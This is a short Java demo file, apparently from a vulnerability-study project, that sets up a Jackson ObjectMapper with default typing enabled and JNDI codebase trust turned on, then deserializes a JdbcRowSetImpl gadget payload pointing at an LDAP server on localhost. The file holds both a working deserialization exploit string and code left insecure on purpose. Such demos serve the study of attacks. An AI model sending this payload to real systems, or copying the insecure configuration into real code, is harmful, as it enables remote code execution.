package com.ppp.vulns.core.vulns.serialization;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * @author Whoopsunix
 */
public class JacksonDemo {

    public static void main(String[] args) throws Exception {
        readValue("{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/ehyo2t\",\"autoCommit\":true}");
    }
    public static Object readValue(String json) {
        try {
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
            ObjectMapper objectMapper = new ObjectMapper();
            objectMapper.enableDefaultTyping();
            objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);

            // 用ObjectMapper.disableDefaultTyping()设置为只允许@JsonTypeInfo生效
//                objectMapper.disableDefaultTyping();

//        Method disableDefaultTypingM = objectMapper.getClass().getMethod("disableDefaultTyping");
//        disableDefaultTypingM.invoke(objectMapper);

//        json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/ehyo2t\",\"autoCommit\":true}";
            System.out.println(json);
            Object object = objectMapper.readValue(json, Object.class);
            return object;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
